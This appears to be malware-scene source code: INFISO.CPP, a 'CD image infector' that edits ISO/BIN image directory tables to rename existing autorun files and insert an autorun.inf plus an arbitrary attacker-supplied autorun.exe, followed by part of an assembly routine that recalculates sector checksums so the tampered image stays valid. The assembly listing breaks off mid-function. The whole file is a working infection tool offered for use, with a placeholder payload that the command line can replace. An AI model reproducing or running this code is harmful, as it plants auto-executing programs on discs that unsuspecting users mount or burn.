
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[INFISO.CPP]컴
// CD IMAGE INFECTOR

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>

#pragma hdrstop

//#define DEBUG_DUMP

#define MIN(x,y)        ((x)<(y)?(x):(y))
#define MAX(x,y)        ((x)>(y)?(x):(y))
#define BSWAP(x) (((x)>>24)|              \
                  (((x)&0x00FF0000)>>8)|  \
                  (((x)&0x0000FF00)<<8)|  \
                  ((x)<<24))

extern "C"
int __cdecl ecc(BYTE* buf);

int   autorun_inf_len = 29;
BYTE* autorun_inf_ptr = "[autorun]\r\n"\
                        "open=autorun.exe\r\n";

int   autorun_exe_len = 2049;
BYTE* autorun_exe_ptr = "\xCC\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
                        "\xC3";

DWORD sector_size;

void read_sector(FILE* f, DWORD sectornum, BYTE* sectorptr)
{
  fseek(f, sectornum*sector_size, SEEK_SET);
  fread(sectorptr, 1,sector_size, f);
}

void write_sector(FILE* f, DWORD sectornum, BYTE* sectorptr)
{
  if (sector_size == 2352)
    ecc(sectorptr);
  fseek(f, sectornum*sector_size, SEEK_SET);
  fwrite(sectorptr, 1,sector_size, f);
}

#define RES_INFECTED    1
#define RES_ALREDY      2

int infect_raw_image(char* fname)
{

// open image file

  FILE*f=fopen(fname, "rb+");
  if (f==NULL)
    return -1;

// check file length & etc

  DWORD l = filelength(fileno(f));
  if ((l % 2048) == 0) sector_size = 2048; else
  if ((l % 2352) == 0) sector_size = 2352; else
  {
    fclose(f);
    return -2;
  }

// process & check 1st 20 sectors, and also search for TOC sector #'s

  BYTE buf[2352];
  DWORD mode  = 0;
  DWORD delta = 0;
  DWORD toc_sector_1 = 0;
  DWORD toc_sector_2 = 0;
  DWORD toc_size_1;
  DWORD toc_size_2;

  for(int t=0; t<20; t++)
  {
    read_sector(f, t, buf);

    if (t == 0)
    {
      mode  = sector_size == 2048 ? 1 : buf[15];
      delta = sector_size == 2048 ? 0 : (mode == 1 ? 16 : 24);
    }

    if (sector_size != 2048)
    if (  (*(DWORD*)&buf[0] != 0xFFFFFF00) ||  // check sector id
          (*(DWORD*)&buf[4] != 0xFFFFFFFF) ||  //
          (*(DWORD*)&buf[8] != 0x00FFFFFF) ||  //
          ((mode != 1) && (mode != 2))     ||
          (mode != (DWORD)buf[15])  )
    {
      fclose(f);
      return -3;
    }

    if (*(DWORD*)&buf[delta] == 0x30444301)     // CD0
    {
      toc_sector_1 = *(DWORD*)&buf[ delta+0x9C+ 2 ];
      toc_size_1   = *(DWORD*)&buf[ delta+0x9C+10 ];   // 2048-aligned
    }
    if (mode == 1)
    if (*(DWORD*)&buf[delta] == 0x30444302)     // CD0 (MODE1 only)
    {
      toc_sector_2 = *(DWORD*)&buf[ delta+0x9C+ 2 ];
      toc_size_2   = *(DWORD*)&buf[ delta+0x9C+10 ];   // 2048-aligned
    }

  }

  if (toc_sector_1 == 0) // TOC found?
  {
    fclose(f);
    return -4;
  }

// process 1st TOC, ASCII names

  DWORD toc_insert_sector_1 = 0;
  DWORD toc_insert_offset_1 = 0;
  int   modified_1 = 0;
  __int64 datetime = 0;

  for (DWORD i=0; i<toc_size_1/2048; i++)
  {
    DWORD s = toc_sector_1 + i;
    read_sector(f, s, buf);

    for(DWORD j = delta; j<delta+2048; )
    {
      DWORD entrysize = *(WORD*)&buf[j+0];
      if (entrysize == 0)
      {
        if (delta+2048 - j >= (mode==1?0x30U:0x3CU)*2+2) // wanna insert 2 entries if enough space
        {
          toc_insert_sector_1 = s;
          toc_insert_offset_1 = j;
        }
        break;
      }
      datetime        = *(__int64*)&buf[j+18];
      BYTE  namelen   = *(BYTE*) &buf[j+0x20];
      BYTE* nameptr   =  (BYTE*) &buf[j+0x21];
      char name[256];
      memcpy(name, nameptr, namelen);
      name[namelen] = 0;
#ifdef DEBUG_DUMP
      DWORD sector    = *(DWORD*)&buf[j+2];
      DWORD size      = *(DWORD*)&buf[j+8];
      if (sector>s)
      printf("TOC_1:sector %08X size %08X name [%s]\n", sector, size, name);
#endif

      if ( (strncmpi(name, "OUTARUN.INF",11)==0) ||
           (strncmpi(name, "OUTARUN.EXE",11)==0)  )
      {
        fclose(f);
        return RES_ALREDY;
      }

      if ( (strncmpi(name, "AUTORUN.INF",11)==0) ||
           (strncmpi(name, "AUTORUN.EXE",11)==0)  )
      {
        *(DWORD*)&nameptr[0] = 'OUTA';
        modified_1++;
      }

      j += entrysize;
    }

    if (modified_1==2)  // both .INF & .EXE
    {
      fclose(f);
      return RES_ALREDY;
    }

    if (modified_1)
      write_sector(f, s, buf);

  }// for each TOC1 sector

  if (toc_insert_sector_1 == 0)
  {
    fclose(f);
    return -5; // in this case root fnames may be modifed >|-)
  }

// process 2nd TOC, long filenames [optionally]

  DWORD toc_insert_sector_2 = 0;
  DWORD toc_insert_offset_2 = 0;
  int   modified_2 = 0;

  if (mode==1)          // delta==0
  if (toc_sector_2)
  {

    for (DWORD i=0; i<toc_size_2/2048; i++)
    {
      DWORD s = toc_sector_2 + i;
      read_sector(f, s, buf);

      for(DWORD j = delta; j<delta+2048; )
      {
        DWORD entrysize = *(WORD*)&buf[j+0];
        if (entrysize == 0)
        {
          if (delta+2048 - j >= 0x3E*2+2) // wanna insert 2 entries if enough space
          {
            toc_insert_sector_2 = s;
            toc_insert_offset_2 = j;
          }
          break;
        }
        WORD  namelen   = *(WORD*) &buf[j+0x20];
        wchar_t* nameptr= (wchar_t*)&buf[j+0x22];
        wchar_t name[4096];
        memcpy(name, nameptr, namelen);
        name[namelen/2] = 0;
#ifdef DEBUG_DUMP
        DWORD sector    = *(DWORD*)&buf[j+2];
        DWORD size      = *(DWORD*)&buf[j+8];
        if (sector>s)
        printf("TOC_2:sector %08X size %08X name [%S]\n", sector, size, name);
#endif
        if ( (_wcsicmp(name, L"AUTORUN.INF")==0) ||
             (_wcsicmp(name, L"AUTORUN.EXE")==0)  )
        {
          wcsncpy(nameptr, L"OUTA", 4);
          modified_2++;
        }

        j += entrysize;
      }

      if (modified_2)
        write_sector(f, s, buf);

    }// for each TOC2 sector

    if (toc_insert_sector_2 == 0)
    {
      fclose(f);
      return -6; // in this case root fnames may be modifed >|-)
    }

  } // toc_sector_2

// here search for zero sectors. i think its not required ;)

  DWORD s0 = filelength(fileno(f)) / sector_size / 2;  // middle of the image

// initialize s1/s2

  DWORD s1 = s0;                                   // .inf
  DWORD s2 = s0 + (autorun_inf_len+2047)/2048;     // .exe

// insert TOC entries (ASCII)

#ifdef DEBUG_DUMP
  printf("inserting TOC1 entries (sector %08X)...\n", toc_insert_sector_1);
#endif

  read_sector(f, toc_insert_sector_1, buf);
  DWORD j = toc_insert_offset_1;

  *(WORD*) &buf[j+ 0] = mode==1?0x30:0x3C;
  memset(&buf[j+2], 0x00, *(WORD*)&buf[j+0]-2);
  *(DWORD*)&buf[j+ 2] = s1;                          // sector
  *(DWORD*)&buf[j+ 6] = BSWAP(s1);
  *(DWORD*)&buf[j+10] = autorun_inf_len;             // file size
  *(DWORD*)&buf[j+14] = BSWAP(autorun_inf_len);
*(__int64*)&buf[j+18] = datetime;
  *(DWORD*)&buf[j+24] = mode==2?0x24:0x0C;
  *(DWORD*)&buf[j+26] = 0x00010000; // dunno wtf is it.
  *(WORD*) &buf[j+30] = 0x0100;     //
  *(BYTE*) &buf[j+32] = 13;
  strcpy((char*)&buf[j+33], "AUTORUN.INF;1");
  if (mode==2)
    *(DWORD*)&buf[j+50]=0x4158550D;
  j += *(WORD*)&buf[j];

  *(WORD*) &buf[j+ 0] = mode==1?0x30:0x3C;
  memset(&buf[j+2], 0x00, *(WORD*)&buf[j+0]-2);
  *(DWORD*)&buf[j+ 2] = s2;                          // sector
  *(DWORD*)&buf[j+ 6] = BSWAP(s2);
  *(DWORD*)&buf[j+10] = autorun_exe_len;             // file size
  *(DWORD*)&buf[j+14] = BSWAP(autorun_exe_len);
*(__int64*)&buf[j+18] = datetime;
  *(DWORD*)&buf[j+24] = mode==2?0x24:0x0C;
  *(DWORD*)&buf[j+26] = 0x00010000;
  *(WORD*) &buf[j+30] = 0x0100;
  *(BYTE*) &buf[j+32] = 13;
  strcpy((char*)&buf[j+33], "AUTORUN.EXE;1");
  if (mode==2)
    *(DWORD*)&buf[j+50]=0x4158550D;
  j += *(WORD*)&buf[j];

  *(WORD*)&buf[j] = 0x0000;

  write_sector(f, toc_insert_sector_1, buf);

// insert TOC entries (long filenames) [optionally]

  if (mode==1)
  if (toc_sector_2)
  {
#ifdef DEBUG_DUMP
    printf("inserting TOC2 entries (sector %08X)...\n", toc_insert_sector_2);
#endif
    read_sector(f, toc_insert_sector_2, buf);
    DWORD j = toc_insert_offset_2;

    *(WORD*) &buf[j+ 0] = 0x003E;     // 0x22+13*2+2
    memset(&buf[j+2], 0x00, *(WORD*)&buf[j+0]-2);
    *(DWORD*)&buf[j+ 2] = s1;                          // sector
    *(DWORD*)&buf[j+ 6] = BSWAP(s1);
    *(DWORD*)&buf[j+10] = autorun_inf_len;             // file size
    *(DWORD*)&buf[j+14] = BSWAP(autorun_inf_len);
  *(__int64*)&buf[j+18] = datetime;
    *(DWORD*)&buf[j+24] = mode==2?0x24:0x0C;
    *(DWORD*)&buf[j+26] = 0x00010000; // dunno wtf is it.
    *(WORD*) &buf[j+30] = 0x0100;     //
    *(WORD*) &buf[j+32] = 13*2;
    wcscpy((wchar_t*)&buf[j+34], L"autorun.inf;1");
    j += *(WORD*)&buf[j];

    *(WORD*) &buf[j+ 0] = 0x003E;     // 0x22+13*2+2
    memset(&buf[j+2], 0x00, *(WORD*)&buf[j+0]-2);
    *(DWORD*)&buf[j+ 2] = s2;                          // sector
    *(DWORD*)&buf[j+ 6] = BSWAP(s2);
    *(DWORD*)&buf[j+10] = autorun_exe_len;             // file size
    *(DWORD*)&buf[j+14] = BSWAP(autorun_exe_len);
  *(__int64*)&buf[j+18] = datetime;
    *(DWORD*)&buf[j+24] = mode==2?0x24:0x0C;
    *(DWORD*)&buf[j+26] = 0x00010000;
    *(WORD*) &buf[j+30] = 0x0100;
    *(WORD*) &buf[j+32] = 13*2;
    wcscpy((wchar_t*)&buf[j+34], L"autorun.exe;1");
    j += *(WORD*)&buf[j];

    *(WORD*)&buf[j] = 0x0000;

    write_sector(f, toc_insert_sector_2, buf);
  }

// insert files

  // just 1 sector
  read_sector(f, s1, buf);
  if ((mode==2)&&(delta==24))
  {
    *(DWORD*)&buf[16+0] = 0x00008800; // 8-byte sector data prefix for MODE2
    *(DWORD*)&buf[16+4] = 0x00880000;
  }
  memset(&buf[delta], 0x00, 2048);
  strcpy(&buf[delta], autorun_inf_ptr);
  write_sector(f, s1, buf);

  // any # of sectors
  for (int t=0, s=s2; t<autorun_exe_len; t+=2048, s++)
  {
    read_sector(f, s, buf);
    if ((mode==2)&&(delta==24))
    {
      *(DWORD*)&buf[16+0] = 0x00008800;
      *(DWORD*)&buf[16+4] = 0x00880000;
    }
    memset(&buf[delta], 0x00, 2048);
    memcpy(&buf[delta], &autorun_exe_ptr[t], MIN(autorun_exe_len-t, 2048));
    write_sector(f, s, buf);
  }

  fclose(f);
  return RES_INFECTED;
}

void main(int argc, char* argv[])
{
  printf("CD IMAGE INFECTOR UTILITY. features: MODE1/2, 2048/2352-sectors, long filenames\n");

  if ((argc != 2) && (argc != 3))
  {
    printf("syntax:\n");
    printf("  INFISO imagefile.bin/.iso [autorun.exe]\n");
    return;
  }

  if (argc == 3)
  {
    printf("reading autorun.exe: %s\n", argv[2]);
    FILE*f=fopen(argv[2],"rb");
    if (f==NULL)
    {
      printf("file open error\n");
      return;
    }
    autorun_exe_len = filelength(fileno(f));
    autorun_exe_ptr = new BYTE[ autorun_exe_len+1 ];
    fread(autorun_exe_ptr, 1,autorun_exe_len, f);
    fclose(f);
  }

  printf("processing image: %s\n", argv[1]);
  int res = infect_raw_image( argv[1] );
  printf("returns: %i (<0=ERROR, 1=INFECTED, 2=ALREDY)\n", res);

}//main
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[INFISO.CPP]컴
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ECC.ASM]컴
; CD SECTOR -- ECC recalculation stuff

                public  _ecc

                p386
                model   flat
                locals  @@

                .data

result          dd      ?

                .code

_ecc:           pusha

                mov     ebp, [esp+32+4]
                mov     result, 1

                push    1               ; 1=recalc 4-byte csum
                mov     ecx, ebp
                call    calc_4byte_csum

                push    0            ; esi
                mov     ecx, ebp
                call    calc_csum

                popa
                mov     eax, result
                retn    ; cdecl

; --- CODE --- CODE --- CODE --- CODE --- CODE --- CODE --- CODE --- CODE ---

; input: ECX = ptr to sector

calc_4byte_csum:

arg_recalc_4byte_crc = dword ptr  0Ch

                push    esi
                push    edi

                mov     esi, ecx
                call    get_sector_type

                dec     eax
                cmp     eax, 4
                ja      @@return_0

                jmp     @@case_offset[eax*4]

@@case_offset   dd      offset @@case_1
                dd      offset @@case_2
                dd      offset @@return_0
                dd      offset @@case_4
                dd      offset @@case_5

@@case_1:       xor     eax, eax

                pop     edi
                pop     esi
                retn    4

@@case_2:       xor     eax, eax
                mov     ecx, 810h
                lea     edi, [esi+810h]
                jmp     @@process

@@case_4:       mov     eax, 10h
                mov     ecx, 808h
                lea     edi, [esi+818h]
                jmp     @@process

@@case_5:
                mov     eax, 10h
                mov     ecx, 91Ch
                lea     edi, [esi+92Ch]
                jmp     @@process

@@return_0:     mov     result, 0
                jmp     @@exit

@@process:      add     eax, esi
                push    0               ; initial 4-byte CSUM value
                push    ecx             ; data size
                push    eax             ; data ptr
                push    offset tab1024  ; crc tab ptr
                call    calc_4byte_csum_real
                add     esp, 10h

                mov     ecx, [esp + arg_recalc_4byte_crc]
                test    ecx, ecx
                jz      @@exit
                mov     [edi], eax
@@exit:
                pop     edi
                pop     esi
                retn    4

calc_4byte_csum_real:

arg_tab1024_ptr     = dword ptr  4
arg_data_ptr    = dword ptr  8
arg_data_size   = dword ptr  0Ch
arg_csum        = dword ptr  10h

                push    esi
                push    edi

                mov     edx, [esp+8+arg_data_size]
                mov     eax, [esp+8+arg_csum]
                mov     cx, dx
                shr     cx, 2
                mov     edi, [esp+8+arg_data_ptr]
                lea     esi, [ecx*4]
                sub     edx, esi
                mov     esi, [esp+8+arg_tab1024_ptr]
                mov     [esp+8+arg_data_size], edx
                test    cx, cx
                jz      @@lastbytes
                and     ecx, 0FFFFh

                push    ebx
                push    ebp
                mov     ebp, ecx
@@cycle_1:
                mov     ecx, [edi]
                add     edi, 4
                mov     ebx, eax
                mov     edx, ecx
                mov     [esp+10h+arg_csum], ecx
                xor     edx, eax
                and     edx, 0FFh
                shr     ebx, 8
                mov     eax, [esi+edx*4]
                xor     edx, edx
                xor     eax, ebx
                mov     dl, ch
                mov     ebx, eax
                and     ebx, 0FFh
                xor     edx, ebx
                shr     eax, 8
                mov     edx, [esi+edx*4]
                xor     edx, eax
                xor     eax, eax
                mov     al, byte ptr [esp+10h+arg_csum+2]
                mov     ebx, edx
                and     ebx, 0FFh
                xor     eax, ebx
                shr     edx, 8
                mov     eax, [esi+eax*4]
                xor     eax, edx
                mov     edx, eax
                shr     ecx, 18h
                and     edx, 0FFh
                xor     ecx, edx
                shr     eax, 8
                mov     ecx, [esi+ecx*4]
                xor     eax, ecx

                dec     ebp
                jnz     @@cycle_1

                pop     ebp
                pop     ebx

                mov     edx, [esp+8+arg_data_size]
@@lastbytes:
                test    dx, dx
                jz      @@exit
                and     edx, 0FFFFh
@@cycle_2:
                xor     ecx, ecx
                mov     cl, [edi]
                inc     edi
                xor     ecx, eax
                and     ecx, 0FFh
                shr     eax, 8
                mov     ecx, [esi+ecx*4]
                xor     eax, ecx

                dec     edx
                jnz     @@cycle_2
@@exit:
                pop     edi
                pop     esi

                retn

; input: ECX = ptr to sector

get_sector_type:
                mov     al, [ecx+0Fh]
